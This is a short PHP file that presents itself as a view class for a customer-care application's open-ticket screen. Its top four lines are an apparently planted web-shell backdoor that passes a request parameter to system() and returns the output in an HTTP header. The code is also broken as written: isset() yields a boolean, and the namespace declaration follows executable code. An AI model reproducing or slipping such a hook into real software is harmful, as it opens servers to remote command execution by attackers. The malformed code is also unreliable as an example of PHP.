<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

namespace customerCareApp;

class View_CustomerOpenTicket extends \componentBase\View_ServerSideComponent {
	public $responsible_namespace = __NAMESPACE__;
	public $responsible_view = 'View_Server_CustomerOpenTicket';
	public $is_sortable = false;
	public $is_resizable=false;
}